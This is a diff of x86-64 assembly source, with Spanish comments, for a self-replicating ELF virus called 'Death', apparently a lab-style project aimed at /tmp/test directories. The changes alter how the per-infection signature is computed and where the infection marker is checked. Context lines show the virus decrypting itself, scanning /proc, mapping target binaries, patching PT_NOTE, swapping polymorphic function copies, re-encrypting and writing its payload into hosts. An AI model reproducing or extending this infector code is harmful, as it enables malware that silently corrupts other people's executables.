@@ -180,76 +180,83 @@ section .text
     __F_mmap__end:
 
     __F_atoi:
-      ; rax = resultado
-      .str_to_int:
-          xor rax, rax
-      .loop:
-          movzx rcx, byte [rsi]   ; cargar caracter
-          test rcx, rcx           ; ¿fin de string?
-          jz .done
-          sub rcx, '0'            ; convertir ASCII a número
-          imul rax, rax, 10       ; resultado *= 10
-          add rax, rcx            ; resultado += digito
-          inc rsi                 ; siguiente caracter
-          jmp .loop
-      .done:
-          ret
+        ; rax = resultado
+        .str_to_int:
+            xor rax, rax
+        .loop:
+            movzx rcx, byte [rsi]   ; cargar caracter
+            test rcx, rcx           ; ¿fin de string?
+            jz .done
+            sub rcx, '0'            ; convertir ASCII a número
+            imul rax, rax, 10       ; resultado *= 10
+            add rax, rcx            ; resultado += digito
+            inc rsi                 ; siguiente caracter
+            jmp .loop
+        .done:
+            ret
     __F_atoi__end:
 
     __F_set_unique_trace:
-      ; rax = integer from atoi(signature)
-      ; lo transformamos haciendo paranoias
-      mov rcx, rax
-      shl rcx, 13
-      xor rax, rcx
+        ; rax = integer from atoi(signature)
+        ; Sumamos a la firma anterior el tamaño final del fichero.
+        ; Esto es para evitar que si lanzamos 2 ejecuciones del mismo virus
+        ; sobre q binarios distintos, la firma sea la misma. En este caso, sí será
+        ; la misma en caso de que ifectemos con el mismo binario el mismo objetivo.
+        ; Pero esa es la gracia, creo. Si no, sería random.
+        mov rcx, VAR(Death.file_final_len)
+        add rax, rcx
 
-      mov rcx, rax
-      shr rcx, 17
-      xor rax, rcx
+        ; lo transformamos haciendo paranoias
+        mov rcx, rax
+        shl rcx, 13
+        xor rax, rcx
 
-      mov rcx, rax
-      shl rcx, 5
-      xor rax, rcx
+        mov rcx, rax
+        shr rcx, 17
+        xor rax, rcx
 
-         ; Dejamos el numero de forma que sea representable en chars (decimal) en 8 cifras.
-      and rax, 0x3FFFFFF
+        mov rcx, rax
+        shl rcx, 5
+        xor rax, rcx
 
-      ; rdi = buf
-      ; destruye: rax, rbx, rdx, rcx
-      lea rdi, [rel Traza]
-      add rdi, Traza_len + 1
-      add rdi, 8
+            ; Dejamos el numero de forma que sea representable en chars (decimal) en 8 cifras.
+        and rax, 0x3FFFFFF
 
-      ; rcx = contador (para escribir 8 bytes exactos)
-      ; r8 = buffer a escribir el numbero transformado. r8 apunta al final del buffer,
-      ; no al principio. Es porque escribimos del final al principio.
-      xor rcx, rcx
-      sub rsp, 8
-      lea rsi, [rsp+7]
+        ; rdi = buf
+        ; destruye: rax, rbx, rdx, rcx
+        lea rdi, [rel Traza]
+        add rdi, Traza_len + 1
+        add rdi, 8
 
-      mov rcx, 8
-      mov rbx, 10
-      .convert_loop:
+        ; rcx = contador (para escribir 8 bytes exactos)
+        ; r8 = buffer a escribir el numbero transformado. r8 apunta al final del buffer,
+        ; no al principio. Es porque escribimos del final al principio.
+        xor rcx, rcx
+        sub rsp, 8
+        lea rsi, [rsp+7]
 
-        ; rax = numerete
-        xor rdx, rdx
-        div rbx       ; rax / rbx. rdx = resto.
+        mov rcx, 8
+        mov rbx, 10
+        .convert_loop:
+            ; rax = numerete
+            xor rdx, rdx
+            div rbx       ; rax / rbx. rdx = resto.
 
-        add dl, '0'
-        mov [rsi], dl
-        dec rsi
-        dec rcx
-        jnz .convert_loop
+            add dl, '0'
+            mov [rsi], dl
+            dec rsi
+            dec rcx
+            jnz .convert_loop
 
-      lea rsi, [rsp]
-      lea rdi, [rel Traza]
-      add rdi, Traza_len + 1
-      mov rcx, 8
-      cld
-      rep movsb
+        lea rsi, [rsp]
+        lea rdi, [rel Traza]
+        add rdi, Traza_len + 1
+        mov rcx, 8
+        cld
+        rep movsb
 
-      add rsp, 8
-      ret
+        add rsp, 8
+        ret
     __F_set_unique_trace__end:
 
     __F_crazy0:
@@ -352,7 +359,7 @@ section .text
         lea rbx, _finish
         sub rbx, rax
         mov dword VAR(Death.virus_size), ebx
-        
+
         CALL_ENCRYPT(encrypt_block) ; desencripta
 
     .open_proc:
@@ -665,7 +672,7 @@ section .text
         mov VAR(Death.mmap_ptr), rax   ; save mmap_ptr
 
     .check_infect:
-        mov rcx, dword Traza_position
+        mov rcx, dword _finish - Traza
         mov rsi, rax
         mov ebx, dword VAR(Death.file_original_len)
         add rsi, rbx
@@ -734,7 +741,7 @@ section .text
 
     .mod_pt_note:
         CALL_ENCRYPT(mod_pt_note)
- 
+
     .unique_trace:
         xor rax, rax
         lea rsi, [rel Traza]
@@ -758,7 +765,7 @@ section .text
 		mul rbx
 
 		; en rax tendemos dl * F_crazy_len
-		; rsi + (dl * F_crazy_len) => direccion de memoria de la funcion a copiar como __F_crazy	
+		; rsi + (dl * F_crazy_len) => direccion de memoria de la funcion a copiar como __F_crazy
 		; rdi                      => direccion de memoria de la __F_crazy a sobreescribir
 		; memcpy(__F_crazy, __F_crazy0 + rax, F_crazy_len);
 		lea rsi, [rel __F_crazy0]
@@ -772,7 +779,7 @@ section .text
         CALL_ENCRYPT(encrypt_block) ; encripta
 
         ; Encriptar data
-    
+
     .write_payload:
         lea rsi, _start
         mov rdi, VAR(Death.mmap_ptr)
@@ -856,11 +863,11 @@ section .text
     dirs            db      0x2F,0x74,0x6D,0x70,0x2F,0x74,0x65,0x73,0x74,0,0x2F,0x74,0x6D,0x70,0x2F,0x74,0x65,0x73,0x74,0x32,0,0  ;"/tmp/test",0,"/tmp/test2",0,0
     proc            db      0x2F,0x70,0x72,0x6F,0x63,0x2f,0 ; "/proc/",0 ; 7
     __F_data__end:
-    Traza_position  equ     _finish - Traza
+    host_entrypoint dq      _dummy_host_entrypoint
+    virus_vaddr     dq      _start
     fix_char        db      0
     Traza           db      "Death version 1.0 (c)oded by tomartin & carce-bo 42069420",0  ;46
     Traza_len       equ     $ - Traza - 1 - 8 - 1
-    host_entrypoint dq      _dummy_host_entrypoint
-    virus_vaddr     dq      _start
+
 
     _finish:
